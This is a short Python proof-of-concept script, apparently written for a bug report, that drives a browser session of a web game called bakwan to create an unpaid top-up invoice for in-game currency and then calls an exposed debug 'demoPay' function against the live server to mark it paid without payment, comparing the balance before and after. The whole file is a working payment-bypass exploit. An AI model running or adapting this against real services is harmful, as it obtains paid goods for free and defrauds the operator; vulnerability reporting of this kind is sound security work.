#!/usr/bin/env python3
"""BUG-11 PoC: demoPay free-purchase bypass on live server.
createTopup(b100) -> demoPay(invoiceId) -> balance check."""
import json
from bakwan_session import Game

def call(g, fn, *args):
    args_js = json.dumps(list(args))
    js = f"""(async () => {{
      const N = window.BFB_DEBUG.Net;
      const r = await N.call('{fn}', {args_js});
      return JSON.parse(JSON.stringify(r));
    }})()"""
    try:
        r = g.ev(js)
        print(f"[{fn}] OK -> {json.dumps(r, ensure_ascii=False, default=str)[:300]}")
        return r
    except Exception as e:
        print(f"[{fn}] ERR -> {str(e).split(chr(10))[0][:200]}")
        return None

def main():
    g = Game()
    try:
        p0 = g.player()
        print(f"BEFORE bakwan={p0['bakwan']}")
        # 1. create a real topup invoice (b100 = 100 bakwan, Rp5000) — NOT paid
        inv = call(g, "createTopup", "b100")
        if isinstance(inv, dict):
            ext = inv.get("externalId") or inv.get("id") or (inv.get("rec") or {}).get("_id")
            print("  invoice:", json.dumps(inv, default=str)[:400])
        else:
            ext = None
        if not ext:
            print("no invoice id; abort")
            return
        # 2. demoPay WITHOUT paying (the bug)
        r = call(g, "demoPay", ext)
        # 3. check balance (fresh read)
        p1 = g.call('bootstrap').get('player')
        print(f"AFTER bakwan={p1['bakwan']} (delta={p1['bakwan']-p0['bakwan']:+d})")
        g.shot("C40_demopay_after")
    finally:
        g.close()

if __name__ == "__main__":
    main()
